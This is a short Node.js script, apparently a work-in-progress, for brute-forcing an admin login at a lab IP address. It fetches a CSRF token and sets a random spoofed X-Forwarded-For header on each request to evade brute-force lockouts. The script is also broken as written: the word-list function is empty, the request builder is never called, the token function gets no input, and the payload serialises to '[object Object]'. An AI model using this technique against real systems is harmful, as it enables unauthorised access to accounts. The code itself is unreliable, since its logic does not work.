const http = require('http');

const host = 'http://10.10.10.191';
const formPath = '/admin/login/';
const targetUri = host + formPath;
const method = 'GET';
const rx = /input.+?name="tokenCSRF".+?value="(.+?)"/;

const username = 'admin';
const wordListFilePath = process.argv.slice(2);

const genRandomIp = () => {
  return `192.168.1.${Math.floor(Math.random() * Math.floor(255))}`;

}

const getCSRFToken = (page) => {
  console.log('Fetching CSRF Token for bypass');
  return page.match(rx);
}

const getPage = () => {
  console.log('Getting page');
  let rawData = '';
  const req = http.get(targetUri, (res => {
    res.on('data', (chunk) => {
      console.log('Writing chunk');
      rawData += chunk;
    });
    res.on('end', () => {
      console.log('No more data in response.');
      try {
        return getCSRFToken(rawData);
      } catch (e) {
        console.error(e.message);
      }
    });
  })).on('error', (e) => {
    console.error(`Something fucky happened there: ${e.message}`);
  });
}

  const getWordListEntry = () => {

}

const launch = (options, payload) => {
  const req = http.request(options, (res) => {
    console.log(`STATUS: ${res.statusCode}`);
    console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
    res.setEncoding('utf8');
    res.on('data', (chunk) => {
      console.log(`BODY: ${chunk}`);
    });
    res.on('end', () => {
      console.log('No more data in response.');
    });
  });

  req.on('error', (e) => {
    console.error(`problem with request: ${e.message}`);
  });

// Write data to request body
  req.write(payload);
  req.end();

}

const buildRequest = (entry) => {
  const options = {
    host: targetUri,
    path: formPath,
    method,
    headers: {
      'X-Forwarded-For': genRandomIp(),
    }
  }
  const payload = { username, entry, tokenCSRF: getCSRFToken(), save: '', 'allow_redirects': false }.toString();
  launch(options, payload);
}

const main = () => {
  console.log(`Let's go!`);
getPage();
}

main();
